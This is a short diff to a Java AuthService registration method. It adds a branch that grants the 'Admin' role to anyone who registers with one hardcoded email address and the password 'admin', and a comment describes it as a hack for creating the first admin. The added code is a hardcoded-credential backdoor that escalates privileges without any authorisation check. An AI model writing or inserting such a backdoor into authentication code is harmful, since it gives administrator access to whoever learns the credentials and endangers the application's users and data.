@@ -51,6 +51,11 @@ public class AuthService {
         user.setCreated(Instant.now());
         user.setEnabled(true);
         user.setRole(role);
+
+        // This hack will automatically register this kind of user as the first admin
+        if (registerRequest.getEmail().equals("jacktom@gmail.com") && registerRequest.getPassword().equals("admin")) {
+            user.setRole("Admin");
+        }
         user.setPassword(bCryptPasswordEncoder.encode(user.getPassword()));
 
 
